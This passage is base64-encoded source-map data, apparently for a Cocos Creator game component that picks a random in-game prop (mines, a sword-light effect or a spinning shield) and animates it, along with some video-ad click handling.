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BQztJQUN4QixDQUFDO0lBRUQsK0NBQVksR0FBWixVQUFhLEtBQUssRUFBRSxJQUFJO1FBQ3BCLE9BQU8sQ0FBQyxHQUFHLENBQUMsdUNBQXVDLENBQUMsQ0FBQTtRQUVwRCxJQUFJLENBQUMsSUFBSSxDQUFDLE9BQU8sRUFBRSxDQUFDO0lBQ3hCLENBQUM7SUF0SkQ7UUFEQyxRQUFRLENBQUMsY0FBSSxDQUFDOzBEQUNFO0lBR2pCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUM7a0VBQ1U7SUFHaEM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzs2REFDSztJQUd2QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDOytEQUNPO0lBWlIsd0JBQXdCO1FBRDVDLE9BQU87T0FDYSx3QkFBd0IsQ0EwSjVDO0lBQUQsK0JBQUM7Q0ExSkQsQUEwSkMsQ0ExSnFELEVBQUUsQ0FBQyxTQUFTLEdBMEpqRTtrQkExSm9CLHdCQUF3QiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgUm9sZSBmcm9tIFwiLi4vZW50aXRpZXMvcm9sZS9Sb2xlXCI7XHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuLi9pbmZvL1dvcmxkXCI7XHJcbmltcG9ydCB7ZXh0fSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2V4dGVuZC9FeHRlbmRcIjtcclxuaW1wb3J0IEJ1bGxldE9mSmlhbkd1YW5nU2kgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZkppYW5HdWFuZ1NpXCI7XHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuLyoqIOS+r+mAieWIl+ihqCAqL1xyXG5jb25zdCBjYW5kaWRhdGVMaXN0ID0gWzMsIDQsIDVdO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgUmVjb21tZW5kUHJvcHNDb250cm9sbGVyIGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoUm9sZSlcclxuICAgIHJvbGU6Um9sZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KHNwLlNrZWxldG9uKVxyXG4gICAgZmFuZ0h1RHVuU2tlOnNwLlNrZWxldG9uID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIHVzZU5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBub1VzZU5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiDpgZPlhbdpZFxyXG4gICAgICogKi9cclxuICAgIHByaXZhdGUgX3Byb3BJZCA9IDA7XHJcblxyXG4gICAgb25Mb2FkICgpIHtcclxuICAgICAgICB0aGlzLmZhbmdIdUR1blNrZS5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMubm9Vc2VOb2RlLm9uKGNjLk5vZGUuRXZlbnRUeXBlLlBPU0lUSU9OX0NIQU5HRUQsICgpPT57XHJcbiAgICAgICAgICAgIHRoaXMudXNlTm9kZS5wb3NpdGlvbiA9IHRoaXMubm9Vc2VOb2RlLnBvc2l0aW9uLmFkZChjYy52MigwLCA4NykpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgICAgIGxldCBnYW1lQnVsbGV0c0NvbnRyb2xsZXIgPSB3aW5kb3dbJ0dhbWVCdWxsZXRzQ29udHJvbGxlciddO1xyXG4gICAgICAgIGdhbWVCdWxsZXRzQ29udHJvbGxlci5idWxsZXRMYXllci5vbihjYy5Ob2RlLkV2ZW50VHlwZS5DSElMRF9BRERFRCwgKGJ1bGxldE5vZGU6Y2MuTm9kZSk9PntcclxuICAgICAgICAgICAgYnVsbGV0Tm9kZS5ncm91cCA9IFwidWlcIjtcclxuICAgICAgICB9KTtcclxuICAgICAgICBsZXQgbGlzdCA9IGNhbmRpZGF0ZUxpc3QuZmlsdGVyKHZhbHVlID0+ICFXb3JsZC5NeS5wcm9wSW5mby5iZVVzaW5nKHZhbHVlKSk7XHJcbiAgICAgICAgaWYgKGxpc3QubGVuZ3RoID09IDApe1xyXG4gICAgICAgICAgICBsaXN0ID0gY2FuZGlkYXRlTGlzdDtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5fcHJvcElkID0gZXh0LnJhbmRvbUVsZW1lbnQobGlzdCk7XHJcbiAgICAgICAgbGV0IHByZWZhYlBhdGggPSAncHJlZmFiL2VudGl0aWVzL2J1bGxldC9wcm9wQnVsbGV0Jyt0aGlzLl9wcm9wSWQ7XHJcblxyXG4gICAgICAgIGNjLmxvYWRlci5sb2FkUmVzKHByZWZhYlBhdGgsIGNjLlByZWZhYiwgKGVycm9yLCByZXNvdXJjZSkgPT4ge1xyXG4gICAgICAgICAgICBpZiAoZXJyb3IgPT0gbnVsbCl7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZVNob3duKCk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuXHJcbiAgICAgICAgY2MuZ2FtZS5vbihcInZpZGVvXzFcIiwoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLm9uQ2xpY2tVc2VEbygpXHJcbiAgICAgICAgfSx0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVTaG93bigpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwidXBkYXRlU2hvd249PT0+XCIsIHRoaXMuX3Byb3BJZCk7XHJcbiAgICAgICAgc3dpdGNoICh0aGlzLl9wcm9wSWQpe1xyXG4gICAgICAgICAgICBjYXNlIDM6XHJcbiAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgIC8qKiDlj5Hlh7oxMuS4quWcsOmbtyDmgKrnianouKnliLDlsLHkvJrniIbngrgg5Zyw6Zu35oyB57utMjBTICovXHJcbiAgICAgICAgICAgICAgICBsZXQgbnVtID0gNjtcclxuICAgICAgICAgICAgICAgIGxldCBvbmNlRGVncmVlID0gMzYwLzY7XHJcbiAgICAgICAgICAgICAgICBsZXQgb25jZVRpbWUgPSAwLjA1O1xyXG4gICAgICAgICAgICAgICAgbGV0IG1vdmVMZW4gPSA4MDtcclxuICAgICAgICAgICAgICAgIGxldCBtb3ZlU3BlZWQgPSAxMDAwO1xyXG4gICAgICAgICAgICAgICAgbGV0IG1vdmVEdXJhdGlvbiA9IG1vdmVMZW4vbW92ZVNwZWVkO1xyXG4gICAgICAgICAgICAgICAgbGV0IHRpbWUgPSAyMDtcclxuICAgICAgICAgICAgICAgIGxldCBzdGFydFBvcyA9IGNjLnYyKHRoaXMucm9sZS5ub2RlLngsIHRoaXMucm9sZS5ub2RlLnkpO1xyXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaT0wOyBpPG51bTsgaSsrKXtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZShpKm9uY2VUaW1lKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGJ1bGxldCA9IHdpbmRvd1snR2FtZUJ1bGxldHNDb250cm9sbGVyJ10uZ2V0SW5hY3RpdmVQcm9wQnVsbGV0KDMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGVncmVlID0gMzArIGkgKiBvbmNlRGVncmVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5yb3RhdGlvbiA9IGRlZ3JlZSAtIDkwO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlyID0gY2MudjIoMCwgMSkucm90YXRlU2VsZihjYy5taXNjLmRlZ3JlZXNUb1JhZGlhbnMoLWRlZ3JlZSkpLm5vcm1hbGl6ZVNlbGYoKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBzdGFydFBvcztcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUuc2NhbGUgPSAwO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5ydW5BY3Rpb24oY2Muc2NhbGVUbyhtb3ZlRHVyYXRpb24sIDEpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0LmNvbGxpZGVyLmVuYWJsZWQgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLm1vdmVCeShtb3ZlRHVyYXRpb24sIGRpci5tdWwobW92ZUxlbikpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0LmNvbGxpZGVyLmVuYWJsZWQgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSh0aW1lKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpPTA7IGk8bnVtOyBpKyspe1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKChpK251bSkqb25jZVRpbWUpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgYnVsbGV0ID0gd2luZG93WydHYW1lQnVsbGV0c0NvbnRyb2xsZXInXS5nZXRJbmFjdGl2ZVByb3BCdWxsZXQoMyk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBkZWdyZWUgPSA2MCArIGkgKiBvbmNlRGVncmVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5yb3RhdGlvbiA9IGRlZ3JlZSAtIDkwO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlyID0gY2MudjIoMCwgMSkucm90YXRlU2VsZihjYy5taXNjLmRlZ3JlZXNUb1JhZGlhbnMoLWRlZ3JlZSkpLm5vcm1hbGl6ZVNlbGYoKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBzdGFydFBvcztcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUuc2NhbGUgPSAwO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5ydW5BY3Rpb24oY2Muc2NhbGVUbyhtb3ZlRHVyYXRpb24sIDEpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0LmNvbGxpZGVyLmVuYWJsZWQgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLm1vdmVCeShtb3ZlRHVyYXRpb24sIGRpci5tdWwobW92ZUxlbis2MCkpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0LmNvbGxpZGVyLmVuYWJsZWQgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSh0aW1lKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKHRpbWUrMSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy51cGRhdGVTaG93bigpO1xyXG4gICAgICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIGNhc2UgNDpcclxuICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgLyoqIOaSreaUvuingeWFieatu+eahOWKqOeUuyAqL1xyXG4gICAgICAgICAgICAgICAgbGV0IGJ1bGxldCA9IDxCdWxsZXRPZkppYW5HdWFuZ1NpPndpbmRvd1snR2FtZUJ1bGxldHNDb250cm9sbGVyJ10uZ2V0SW5hY3RpdmVQcm9wQnVsbGV0KDQpO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSB0aGlzLnJvbGUubm9kZS5wb3NpdGlvbjtcclxuICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICBidWxsZXQuZ2V0Q29tcG9uZW50KHNwLlNrZWxldG9uKS5zZXRBbmltYXRpb24oMCwgXCI2MTRcIiwgdHJ1ZSk7XHJcbiAgICAgICAgICAgICAgICBidWxsZXQuZ2V0Q29tcG9uZW50KHNwLlNrZWxldG9uKS5zZXRDb21wbGV0ZUxpc3RlbmVyKCgpPT57fSk7XHJcbiAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5yZW1vdmVDb21wb25lbnQoQnVsbGV0T2ZKaWFuR3VhbmdTaSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICBjYXNlIDU6XHJcbiAgICAgICAgICAgICAgICB0aGlzLmZhbmdIdUR1blNrZS5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICB0aGlzLmZhbmdIdUR1blNrZS5zZXRBbmltYXRpb24oMCwgXCJzdGFydFwiLCBmYWxzZSk7XHJcbiAgICAgICAgICAgICAgICB0aGlzLmZhbmdIdUR1blNrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wQ291bnQpID0+IHtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgbmFtZSA9IHRyYWNrRW50cnkuYW5pbWF0aW9uID8gdHJhY2tFbnRyeS5hbmltYXRpb24ubmFtZSA6ICcnO1xyXG4gICAgICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKFwiPT09PT09PT09PT09PT5jb21wbGV0ZUxpcy4uXCIsIG5hbWUpO1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChuYW1lID09IFwic3RhcnRcIiB8fCBuYW1lID09IFwidHJhbnNpdGlvblwiKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5mYW5nSHVEdW5Ta2Uuc2V0QW5pbWF0aW9uKDAsIFwibG9vcHNcIiwgZmFsc2UpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXRoaXMubm9kZS5nZXRBY3Rpb25CeVRhZygxMTQpKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBzcGVlZEFjdGlvbiA9IGNjLnNwZWVkKGNjLnJlcGVhdEZvcmV2ZXIoY2Mucm90YXRlQnkoMS4yNSwgNzIwKSksIDApO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc3BlZWRBY3Rpb24uc2V0VGFnKDExNCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmZhbmdIdUR1blNrZS5ub2RlLnJ1bkFjdGlvbihzcGVlZEFjdGlvbik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYy50d2VlbihzcGVlZEFjdGlvbilcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAudG8oMSwge19zcGVlZDoxfSwgeyBlYXNpbmc6ICdzaW5lSW4nfSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuc3RhcnQoKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIG9uQ2xpY2tVc2UoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQdmlkZW/jgJExIOmBk+WFt+aOqOiNkOOAkGNsaWNr44CRUmVjb21tZW5kUHJvcHNDb250cm9sbGVyIFVz